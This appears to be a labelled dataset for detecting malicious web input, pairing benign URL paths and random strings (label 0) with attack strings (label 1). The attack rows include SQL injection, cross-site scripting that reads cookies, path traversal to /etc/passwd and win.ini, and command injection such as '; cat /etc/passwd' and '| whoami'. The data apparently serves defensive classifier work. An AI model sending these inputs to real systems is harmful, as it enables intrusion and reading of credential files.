/blog?session=61773,0
dashboard,0
/settings?id=7725,0
BamRtVxz,0
/cart?id=7308,0
/user?session=58075,0
jEplE6ah9W2cfU,0
about,0
/profile?id=2519,0
/cart?id=7807,0
HNtMslPgEZYFzm,0
../../../windows/win.ini,1
/settings?id=5689,0
admin'/* bypass */OR 1=1,1
<script>var a=366;alert(a)</script>,1
dashboard,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=858;alert(a)</script>,1
aNaM0v1R,0
<script>var a=242;alert(a)</script>,1
admin%00' OR 1=1,1
; cat /etc/passwd,1
/blog?session=24412,0
/register?id=2909,0
' OR 2=9 --,1
/cart?id=5698,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/contact?session=21489,0
tERcuNnGxDqaYi,0
/register?session=47748,0
/checkout?session=50879,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../../etc/passwd,1
user,0
RHXKMRMiBPILxb,0
user,0
<script>var a=188;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
KsyLFLNsQOy,0
<script>var a=190;alert(a)</script>,1
5S5z3MTH,0
/checkout?id=8730,0
../../../../etc/passwd,1
about,0
<script>var a=229;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/register?id=923,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=8644,0
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
lfhsQqqzgbM6m6,0
/index?session=64056,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
1' o r '1'='1,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 8=2 --,1
home,0
<script>var a=652;alert(a)</script>,1
<script>var a=866;alert(a)</script>,1
' OR 8=4 --,1
admin' --,1
' OR 1=1 --,1
/dashboard?session=55214,0
admin' --,1
<script>var a=482;alert(a)</script>,1
/settings?session=10546,0
ePE5FPQi,0
' OR 3=3 --,1
/cart?id=298,0
/checkout?id=8454,0
| whoami,1
admin'/* bypass */OR 1=1,1
' OR 6=4 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=20402,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
/contact?id=6172,0
' OR 6=2 --,1
/login?id=5764,0
/register?id=3081,0
' OR 6=6 --,1
profile,0
settings,0
<script>var a=793;alert(a)</script>,1
' OR 5=7 --,1
' OR 7=3 --,1
/search?session=57598,0
dashboard,0
Vogy13GEaP1GZ,0
/cart?id=1578,0
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
cart,0
<script>var a=54;alert(a)</script>,1
' OR 7=9 --,1
<script>var a=75;alert(a)</script>,1
' OR 1=1 --,1
checkout,0
/about?id=2450,0
<script>var a=606;alert(a)</script>,1
about,0
<script>var a=304;alert(a)</script>,1
/user?id=1980,0
| whoami,1
gfI6MzIh,0
/cart?id=2568,0
/checkout?id=1748,0
admin%00' OR 1=1,1
/checkout?session=10735,0
u6KymIyk4vk6,0
<script>var a=399;alert(a)</script>,1
AJcG5MdF7w,0
/profile?session=48291,0
/user?id=4598,0
' OR 1=1 --,1
A6j3evgoLlmal,0
/blog?session=76395,0
cqFSFtAsH9Cis6,0
XVRYeKz8mWd,0
/user?session=58057,0
profile,0
XWlQxnBVCDnf4,0
' OR 1=1 --,1
/register?id=58,0
/profile?id=7920,0
' OR '1'='1,1
3MgkYijtR4Hir,0
s E l E c T * f R o M a d m i n,1
<script>var a=189;alert(a)</script>,1
javascript:alert(1),1
onerror=alert(1),1
about,0
/about?session=23939,0
about,0
checkout,0
../../../../etc/passwd,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
TYYs3FQdrVzbU7Y,0
/settings?session=66574,0
s E l E c T * f R o M a d m i n,1
index,0
<script>alert(document.cookie)</script>,1
/contact?session=79350,0
/about?id=2481,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=844;alert(a)</script>,1
/cart?session=34039,0
<script>var a=702;alert(a)</script>,1
' OR 7=6 --,1
| whoami,1
onerror=alert(1),1
admin' --,1
' OR 3=2 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=4075,0
user,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
' OR 1=2 --,1
/blog?id=8309,0
/about?id=3013,0
' OR 5=2 --,1
register,0
login,0
<script>var a=239;alert(a)</script>,1
mLwQLvKR6R,0
/dashboard?id=949,0
<script>var a=177;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
checkout,0
VuUjf5j4hgc,0
/contact?id=5578,0
/contact?id=5225,0
/index?id=3727,0
../../../../etc/passwd,1
/home?id=8363,0
<script>var a=995;alert(a)</script>,1
/settings?id=2836,0
search,0
tdQTtQp2ELPS,0
QIm2pp6V5QI0,0
<script>var a=922;alert(a)</script>,1
onerror=alert(1),1
../../../windows/win.ini,1
<script>var a=777;alert(a)</script>,1
index,0
<script>var a=822;alert(a)</script>,1
<script>var a=893;alert(a)</script>,1
22eNjFWyzD,0
<script>var a=595;alert(a)</script>,1
login,0
register,0
vEoA4Ofyvj,0
8u9EucnV5421hBv,0
/user?id=6467,0
' OR 2=9 --,1
B6GJDZJW7SsGNi1,0
home,0
profile,0
' OR '1'='1,1
' OR 2=3 --,1
bND5efxdx,0
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
1' o r '1'='1,1
/dashboard?session=61286,0
/checkout?session=82677,0
/user?session=82792,0
/profile?id=1710,0
| whoami,1
/home?id=3284,0
1' o r '1'='1,1
' OR 1=7 --,1
<script>var a=334;alert(a)</script>,1
../../../windows/win.ini,1
' OR 2=3 --,1
avY0tnNpVZstFWW,0
' OR 2=9 --,1
/profile?session=44267,0
McVLAfTSJ,0
<script>var a=111;alert(a)</script>,1
<script>var a=474;alert(a)</script>,1
settings,0
/checkout?id=1919,0
<script>var a=168;alert(a)</script>,1
onerror=alert(1),1
iW29me1LJn7ti,0
search,0
<script>var a=959;alert(a)</script>,1
/home?id=9508,0
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
; cat /etc/passwd,1
home,0
/cart?session=30431,0
search,0
/profile?session=79151,0
' OR 1=1 --,1
contact,0
search,0
VetgcHeF9F,0
/register?id=8353,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
onerror=alert(1),1
l2E1swGm,0
Cb9wtAEm26J,0
' OR '1'='1,1
login,0
contact,0
<script>var a=852;alert(a)</script>,1
../../../../etc/passwd,1
idDqkBIXlwE,0
ZsJK2HfyFm2FYkb,0
/profile?id=5962,0
/home?session=57694,0
checkout,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cRSVdENr,0
' OR 6=1 --,1
<script>alert(document.cookie)</script>,1
<script>var a=421;alert(a)</script>,1
/cart?session=29651,0
<script>alert(document.cookie)</script>,1
2E3p5quAzs4C,0
/settings?id=2880,0
<script>alert(document.cookie)</script>,1
/contact?session=85554,0
Uyg4Rs8DVAK,0
../../../../etc/passwd,1
<script>var a=989;alert(a)</script>,1
<script>var a=658;alert(a)</script>,1
settings,0
/index?session=40511,0
s E l E c T * f R o M a d m i n,1
/home?session=18157,0
admin' --,1
contact,0
iiiqqCdy,0
' OR 4=9 --,1
<script>alert(document.cookie)</script>,1
<script>var a=394;alert(a)</script>,1
/register?session=38769,0
' OR 6=5 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR '1'='1,1
| whoami,1
GoR6lZ47U,0
<script>alert(document.cookie)</script>,1
' OR '1'='1,1
<script>var a=91;alert(a)</script>,1
/login?session=13059,0
; cat /etc/passwd,1
<script>var a=445;alert(a)</script>,1
/user?session=68484,0
user,0
/checkout?id=3445,0
<script>var a=524;alert(a)</script>,1
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
admin' --,1
' OR 4=1 --,1
search,0
| whoami,1
/contact?id=971,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?session=12383,0
1' o r '1'='1,1
| whoami,1
/login?id=8622,0
/blog?id=7147,0
onerror=alert(1),1
olwlU5BbkVl,0
/dashboard?session=48670,0
/login?id=4173,0
/cart?id=1318,0
/checkout?id=7163,0
/settings?id=6787,0
index,0
dbDdCY6RyD9Qq,0
/login?session=85819,0
javascript:alert(1),1
zHZlLiLr6wlVR,0
../../../windows/win.ini,1
../../../../etc/passwd,1
/home?id=2085,0
admin%00' OR 1=1,1
/cart?session=86169,0
' OR '1'='1,1
' OR 4=5 --,1
/profile?id=6608,0
profile,0
/profile?id=705,0
' OR 5=2 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=560;alert(a)</script>,1
/login?id=818,0
/login?session=25415,0
/checkout?session=65741,0
' OR 9=9 --,1
register,0
profile,0
/settings?session=78488,0
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
IquGl9nS,0
/user?id=7405,0
/index?session=31897,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
register,0
register,0
admin'/* bypass */OR 1=1,1
o05KVd2rhTnHC3V,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/settings?id=8034,0
/settings?session=71882,0
/cart?session=85510,0
cart,0
' OR 2=7 --,1
/login?session=23827,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
ucBUIAcYscbw7FV,0
TKNz2ykR,0
xjpnbW8DmKkyd,0
profile,0
profile,0
admin'/* bypass */OR 1=1,1
/cart?id=6929,0
0XIveWbU,0
/blog?session=49116,0
/login?session=94733,0
../../../../etc/passwd,1
RaOtzTH30zXIjAD,0
eSQKnRGO1At,0
profile,0
kHyGzUsz,0
/settings?session=36999,0
login,0
<script>var a=527;alert(a)</script>,1
/login?session=91243,0
/cart?id=2531,0
/index?id=681,0
OsRyZL1X4yFHAV,0
../../../../etc/passwd,1
checkout,0
../../../windows/win.ini,1
settings,0
/dashboard?id=5577,0
/login?session=38133,0
/search?id=5506,0
/login?id=1492,0
/dashboard?id=5492,0
; cat /etc/passwd,1
/cart?id=3362,0
' OR 4=1 --,1
/settings?id=2787,0
<script>alert(document.cookie)</script>,1
/profile?session=30773,0
' OR 8=6 --,1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
' OR 2=4 --,1
/checkout?session=17499,0
home,0
about,0
settings,0
<script>var a=603;alert(a)</script>,1
' OR 4=3 --,1
<script>var a=147;alert(a)</script>,1
/home?id=1268,0
1' o r '1'='1,1
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
txnxJJgeQbbUsC,0
' OR 5=6 --,1
<script>var a=239;alert(a)</script>,1
' OR 1=1 --,1
' OR 3=8 --,1
8RlbSCkLSuF,0
<script>var a=794;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
/about?session=74111,0
<script>var a=139;alert(a)</script>,1
register,0
/settings?id=6164,0
NfzNUnhr1,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
login,0
xjrOWvkr,0
/checkout?session=25763,0
' OR 7=9 --,1
/about?session=73723,0
rztOVORgH,0
admin%00' OR 1=1,1
' OR 1=5 --,1
<script>alert(document.cookie)</script>,1
<script>var a=663;alert(a)</script>,1
' OR 9=4 --,1
/search?session=15323,0
/about?session=83032,0
admin'/* bypass */OR 1=1,1
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
vsuP8c9eYKjU1,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=772;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
aFBxrdR40,0
/about?session=46099,0
javascript:alert(1),1
admin%00' OR 1=1,1
FwDUn4SS0rbKC,0
../../../../etc/passwd,1
<script>var a=393;alert(a)</script>,1
register,0
../../../windows/win.ini,1
/blog?session=18498,0
' OR 9=7 --,1
Fw7dzfO73x61V,0
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
3MSEhYm2,0
' OR 1=1 --,1
' OR 6=5 --,1
about,0
' OR 6=3 --,1
admin%00' OR 1=1,1
../../../windows/win.ini,1
/register?session=51470,0
bA9iqNsj,0
/register?id=4162,0
/about?session=44142,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?session=33488,0
<script>var a=52;alert(a)</script>,1
/home?session=64403,0
' OR '1'='1,1
| whoami,1
' OR 8=2 --,1
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
' OR '1'='1,1
../../../windows/win.ini,1
| whoami,1
onerror=alert(1),1
jtWSNKsxus,0
admin%00' OR 1=1,1
jjEVZKAAA9r,0
/dashboard?id=9238,0
kXT9l0GJU6AN,0
/about?session=53926,0
TXH1dtHyf7yYDs,0
<script>var a=732;alert(a)</script>,1
<script>var a=526;alert(a)</script>,1
/index?id=3022,0
; cat /etc/passwd,1
0ZfcobAMZI,0
' OR 8=8 --,1
s E l E c T * f R o M a d m i n,1
' OR '1'='1,1
' OR '1'='1,1
/cart?session=55166,0
admin'/* bypass */OR 1=1,1
' OR 4=2 --,1
/contact?id=3063,0
profile,0
/profile?session=85954,0
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
<script>var a=228;alert(a)</script>,1
<script>var a=291;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=9380,0
<script>var a=50;alert(a)</script>,1
/register?id=3558,0
admin%00' OR 1=1,1
SglYEdtazwfxG,0
' OR 1=5 --,1
IZVkqqEmAEUQQa6,0
s E l E c T * f R o M a d m i n,1
search,0
register,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
; cat /etc/passwd,1
/settings?session=94439,0
/dashboard?id=8860,0
admin'/* bypass */OR 1=1,1
| whoami,1
/register?id=7013,0
HM8RVl4Q,0
s E l E c T * f R o M a d m i n,1
javascript:alert(1),1
/cart?id=905,0
/search?id=438,0
pQig8JwWgr1XGk,0
Xnq4Wxd0,0
admin' --,1
' OR 5=9 --,1
<script>var a=986;alert(a)</script>,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=22951,0
| whoami,1
admin'/* bypass */OR 1=1,1
ECMCHmCet,0
cart,0
/register?session=52209,0
/index?session=73475,0
aUFxRZsLb2RM9UA,0
admin' --,1
about,0
' OR 9=1 --,1
/login?session=77275,0
/checkout?id=3595,0
/profile?id=4227,0
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
settings,0
1' o r '1'='1,1
/search?session=96631,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
' OR 6=5 --,1
../../../windows/win.ini,1
<script>var a=499;alert(a)</script>,1
<script>var a=792;alert(a)</script>,1
LVN16agS9,0
javascript:alert(1),1
' OR 5=8 --,1
| whoami,1
9qkL694AKr,0
' OR 1=4 --,1
xrbUx6QwwIz3,0
' OR 6=6 --,1
oRBD9tHjFx8znu,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
YUo9SSDWSE1qPw,0
/settings?session=19926,0
../../../windows/win.ini,1
../../../windows/win.ini,1
/search?id=1538,0
<script>var a=141;alert(a)</script>,1
/login?id=5259,0
/settings?id=3843,0
/search?id=127,0
/login?session=91916,0
admin'/* bypass */OR 1=1,1
admin' --,1
' OR 1=1 --,1
/search?session=12669,0
' OR 6=2 --,1
/home?session=61324,0
<script>alert(document.cookie)</script>,1
../../../../etc/passwd,1
javascript:alert(1),1
../../../../etc/passwd,1
| whoami,1
<script>var a=180;alert(a)</script>,1
/profile?session=66504,0
' OR 1=4 --,1
/search?session=21692,0
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
/index?session=53475,0
search,0
/index?session=61962,0
admin'/* bypass */OR 1=1,1
/dashboard?id=3574,0
admin%00' OR 1=1,1
/index?id=8220,0
T2vIM2yfdJkDOCs,0
/login?session=82671,0
register,0
' OR 5=9 --,1
cart,0
' OR 1=1 --,1
PvdcoMaO6gn,0
cart,0
gpPKcaMZ,0
| whoami,1
e9QXf11bZL9,0
/home?id=8449,0
/dashboard?id=2049,0
' OR 4=5 --,1
/login?session=96353,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 7=5 --,1
../../../windows/win.ini,1
' OR 8=8 --,1
/blog?session=59147,0
/home?session=60415,0
cvHTUD6wx,0
<script>var a=493;alert(a)</script>,1
<script>var a=635;alert(a)</script>,1
/about?id=3732,0
1' o r '1'='1,1
<script>var a=673;alert(a)</script>,1
home,0
/dashboard?session=28106,0
s E l E c T * f R o M a d m i n,1
' OR 6=5 --,1
../../../../etc/passwd,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?session=16130,0
profile,0
<script>var a=494;alert(a)</script>,1
/profile?id=618,0
16CrHiDOK5yx,0
/dashboard?session=14894,0
about,0
' OR 9=5 --,1
NTc1yVafHdEln,0
onerror=alert(1),1
/about?session=24387,0
/user?id=7722,0
<script>var a=958;alert(a)</script>,1
YWIs2pF7,0
' OR 3=2 --,1
user,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/user?session=95540,0
<script>var a=159;alert(a)</script>,1
rTgRoW0xqc,0
register,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=27344,0
' OR 2=4 --,1
' OR 4=9 --,1
../../../../etc/passwd,1
' OR 8=2 --,1
login,0
HrT7pEvx,0
ZQqcduUC3M,0
index,0
javascript:alert(1),1
' OR 7=3 --,1
IeDyFntd,0
' OR '1'='1,1
/profile?session=11314,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
; cat /etc/passwd,1
/login?session=44239,0
WFr5dEQVWdcZDbb,0
x3s1Z0p9Y0,0
/register?id=1747,0
n6btBGBh1LD7bCo,0
<script>var a=33;alert(a)</script>,1
../../../../etc/passwd,1
/dashboard?session=77810,0
contact,0
w4J15wPzP0U,0
d283p1551e0ljLU,0
/blog?id=8082,0
' OR 6=7 --,1
1' o r '1'='1,1
<script>var a=740;alert(a)</script>,1
/cart?id=7171,0
<script>var a=150;alert(a)</script>,1
index,0
' OR '1'='1,1
fP4vgHuW2gL,0
' OR 1=1 --,1
../../../../etc/passwd,1
/login?id=1859,0
AfaT2ErVVN,0
s E l E c T * f R o M a d m i n,1
/dashboard?id=5226,0
profile,0
<script>var a=895;alert(a)</script>,1
yM6GHUHkLQksER,0
home,0
admin'/* bypass */OR 1=1,1
/index?id=6962,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=728;alert(a)</script>,1
IqFItTw4p,0
../../../windows/win.ini,1
/register?session=82910,0
<script>var a=691;alert(a)</script>,1
| whoami,1
about,0
contact,0
/user?session=11501,0
DBys3iMdbv,0
/user?session=96954,0
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
settings,0
dashboard,0
<script>var a=42;alert(a)</script>,1
admin%00' OR 1=1,1
yxdVYW3Tvm,0
/login?session=34169,0
' OR 4=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
MLasPQkZc,0
' OR 6=2 --,1
home,0
../../../windows/win.ini,1
admin%00' OR 1=1,1
admin'/* bypass */OR 1=1,1
bMUUjEMosWG8,0
/index?id=8457,0
dashboard,0
/login?id=1514,0
<script>var a=761;alert(a)</script>,1
' OR 1=1 --,1
<script>var a=874;alert(a)</script>,1
/profile?id=3144,0
<script>alert(document.cookie)</script>,1
/search?session=49260,0
profile,0
<script>var a=556;alert(a)</script>,1
BP16hS4j,0
' OR 8=1 --,1
' OR 7=4 --,1
login,0
/dashboard?id=4529,0
settings,0
FbbgxYhhQ,0
fZqG0DAipwnpcOa,0
; cat /etc/passwd,1
| whoami,1
Blh1HyyidU,0
eATgAKfRgYiL,0
<script>alert(document.cookie)</script>,1
BJAVfPxTbtU,0
register,0
44W0jkze,0
' OR 5=3 --,1
' OR '1'='1,1
frqtZxPDOp,0
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
' OR 4=1 --,1
/settings?id=9095,0
admin%00' OR 1=1,1
' OR 7=7 --,1
/blog?session=21578,0
' OR 5=8 --,1
DF2StHutz,0
dashboard,0
/login?session=48153,0
s E l E c T * f R o M a d m i n,1
<script>var a=310;alert(a)</script>,1
/home?session=29888,0
/blog?id=4709,0
/index?session=47761,0
about,0
NvTkKnJX,0
profile,0
/home?session=72851,0
admin' --,1
/contact?session=10230,0
<script>var a=411;alert(a)</script>,1
contact,0
user,0
qvsgfggoKlJF4wO,0
ojrMcQ62l,0
gktG8Q2n5x6p6,0
ZafEYfsfQgj7k4K,0
<script>var a=129;alert(a)</script>,1
tNPMkjlZq,0
blog,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../../etc/passwd,1
<script>var a=706;alert(a)</script>,1
../../../windows/win.ini,1
../../../windows/win.ini,1
/home?session=50062,0
CBCShWBqrU,0
/search?id=7137,0
' OR 1=7 --,1
<script>var a=244;alert(a)</script>,1
/register?session=12811,0
<script>var a=299;alert(a)</script>,1
' OR 1=1 --,1
/user?session=54452,0
3IInyqlZGxxwu,0
<script>var a=649;alert(a)</script>,1
blog,0
/dashboard?id=5978,0
admin' --,1
CGgsRrK4qCL3Rlt,0
admin' --,1
/home?id=8541,0
/checkout?session=49622,0
| whoami,1
' OR 2=3 --,1
' OR 3=6 --,1
cjTGxNkt,0
/dashboard?session=84825,0
' OR 5=2 --,1
' OR 1=1 --,1
' OR 2=6 --,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
<script>var a=426;alert(a)</script>,1
/checkout?id=9153,0
index,0
Ty0e21UvmOrvi,0
/index?id=5895,0
| whoami,1
/search?id=704,0
/search?id=4201,0
/cart?id=3872,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/settings?id=4278,0
WHFPellJhrxWJI,0
/user?session=70982,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
| whoami,1
wQZV6jIe4Ja,0
/profile?id=9663,0
dw7x5ugFH,0
' OR 8=5 --,1
<script>var a=721;alert(a)</script>,1
4biCMOF8,0
' OR 4=5 --,1
/settings?session=17075,0
javascript:alert(1),1
' OR 1=9 --,1
user,0
/dashboard?session=57993,0
/settings?id=4040,0
checkout,0
/login?session=71896,0
admin'/* bypass */OR 1=1,1
xfxWM9hC0XV,0
5MUkQhPIE,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
search,0
; cat /etc/passwd,1
/home?id=6457,0
/cart?id=8429,0
../../../windows/win.ini,1
fM4uw3xPrrFJqg,0
' OR 1=8 --,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
/about?id=7069,0
<script>var a=193;alert(a)</script>,1
/blog?id=2009,0
<script>var a=596;alert(a)</script>,1
/user?id=6454,0
<script>var a=561;alert(a)</script>,1
' OR 1=9 --,1
<script>var a=305;alert(a)</script>,1
register,0
/index?id=5091,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
admin' --,1
' OR 1=1 --,1
<script>var a=422;alert(a)</script>,1
s E l E c T * f R o M a d m i n,1
/about?session=75700,0
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
| whoami,1
<script>var a=842;alert(a)</script>,1
admin' --,1
../../../../etc/passwd,1
sOx7kjib5gz3JsG,0
/contact?session=95645,0
/login?id=1610,0
/login?id=49,0
/checkout?session=97082,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
cart,0
contact,0
admin%00' OR 1=1,1
<script>var a=877;alert(a)</script>,1
/login?session=87526,0
../../../../etc/passwd,1
login,0
../../../windows/win.ini,1
' OR 7=6 --,1
/about?id=2945,0
/checkout?session=67808,0
blog,0
/profile?id=9202,0
contact,0
| whoami,1
/user?session=94481,0
/user?id=5346,0
ybGqx0dvpyl,0
' OR '1'='1,1
../../../../etc/passwd,1
/user?session=54309,0
search,0
8DX3TVuxIYE,0
/dashboard?id=6472,0
admin'/* bypass */OR 1=1,1
vTsYyqaY33uiozA,0
<script>var a=464;alert(a)</script>,1
1' o r '1'='1,1
user,0
<script>var a=1;alert(a)</script>,1
/cart?id=4149,0
<script>var a=438;alert(a)</script>,1
/register?session=99613,0
register,0
' OR 4=8 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/dashboard?session=93443,0
<script>var a=866;alert(a)</script>,1
../../../../etc/passwd,1
home,0
03TKjZxMo,0
' OR 5=6 --,1
/about?id=935,0
admin' --,1
/profile?id=8131,0
wGzdR7MTK,0
' OR 9=8 --,1
about,0
/search?session=12403,0
/cart?session=85323,0
/cart?id=2602,0
7RWYqpb3km3XFY,0
admin' --,1
' OR '1'='1,1
/checkout?session=20045,0
/contact?session=69393,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
jdBM7kUFl7wH,0
/register?id=3308,0
/register?id=92,0
<script>var a=694;alert(a)</script>,1
BNYW5Fz3HWtT,0
| whoami,1
javascript:alert(1),1
<script>alert(document.cookie)</script>,1
about,0
/cart?session=41082,0
admin' --,1
/login?session=64781,0
' OR '1'='1,1
' OR 8=5 --,1
J5fvREE92,0
<script>var a=977;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=53;alert(a)</script>,1
s9AriQ1uI7S,0
' OR 9=1 --,1
/cart?session=53982,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/register?session=99005,0
Zu94FWQb6F5,0
1' o r '1'='1,1
' OR 3=4 --,1
admin%00' OR 1=1,1
admin%00' OR 1=1,1
/search?id=8886,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 5=2 --,1
<script>var a=131;alert(a)</script>,1
/search?id=274,0
7UnYKuVFBf9,0
../../../windows/win.ini,1
admin' --,1
/register?id=3530,0
KNeteyy9JQnXoPC,0
<script>var a=663;alert(a)</script>,1
Qu9FJsozaa4SV,0
settings,0
/dashboard?session=64433,0
/about?session=63286,0
/about?id=8256,0
' OR 3=9 --,1
/cart?session=38559,0
../../../../etc/passwd,1
gmVpbbNB,0
search,0
search,0
/register?session=89691,0
javascript:alert(1),1
javascript:alert(1),1
index,0
checkout,0
/contact?session=48463,0
<script>var a=254;alert(a)</script>,1
/settings?id=4350,0
index,0
checkout,0
/profile?id=1887,0
home,0
/profile?session=44411,0
ipelHnX8,0
about,0
dashboard,0
<script>var a=798;alert(a)</script>,1
i7IgnJIhYIl73sl,0
/settings?id=5910,0
/register?session=38813,0
' OR 9=6 --,1
/search?session=83902,0
home,0
s E l E c T * f R o M a d m i n,1
/home?session=92797,0
' OR 8=3 --,1
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
/checkout?session=94632,0
' OR 6=5 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
vpCYJ09p,0
' OR 8=9 --,1
' OR 8=4 --,1
dashboard,0
; cat /etc/passwd,1
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
' OR 1=1 --,1
/settings?id=6889,0
/home?id=3138,0
<script>var a=903;alert(a)</script>,1
/index?session=75006,0
<script>var a=750;alert(a)</script>,1
<script>var a=376;alert(a)</script>,1
../../../windows/win.ini,1
javascript:alert(1),1
id8zWKLZliCVwLY,0
| whoami,1
/home?id=2349,0
' OR 1=6 --,1
/search?session=33736,0
<script>var a=6;alert(a)</script>,1
/login?id=4728,0
/profile?id=1662,0
user,0
javascript:alert(1),1
../../../../etc/passwd,1
index,0
WSf7wnjR,0
1' o r '1'='1,1
profile,0
' OR 1=1 --,1
<script>var a=234;alert(a)</script>,1
admin%00' OR 1=1,1
' OR 4=5 --,1
cart,0
/cart?id=3662,0
/contact?session=30563,0
5IXEKNhmEXyv,0
../../../../etc/passwd,1
<script>var a=812;alert(a)</script>,1
/checkout?session=57796,0
user,0
/search?session=25502,0
<script>var a=763;alert(a)</script>,1
<script>var a=285;alert(a)</script>,1
' OR 4=7 --,1
s E l E c T * f R o M a d m i n,1
<script>var a=146;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 5=1 --,1
admin%00' OR 1=1,1
/dashboard?id=6154,0
<script>var a=710;alert(a)</script>,1
/login?id=3044,0
; cat /etc/passwd,1
' OR 1=6 --,1
../../../../etc/passwd,1
<script>var a=991;alert(a)</script>,1
1' o r '1'='1,1
ynZhgxxajGcGeT,0
contact,0
dDCVCvMIXKRI,0
EO7GYRtt,0
<script>var a=543;alert(a)</script>,1
/blog?session=53727,0
/profile?id=1303,0
70WyUkSWdXVWdbQ,0
/contact?id=5403,0
profile,0
<script>alert(document.cookie)</script>,1
1' o r '1'='1,1
/index?session=37348,0
/login?session=94559,0
/home?session=11955,0
/checkout?id=308,0
admin' --,1
javascript:alert(1),1
settings,0
XoV1Q2pS0efZ,0
/cart?session=36099,0
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
i3xPBPmQr,0
../../../../etc/passwd,1
' OR 7=8 --,1
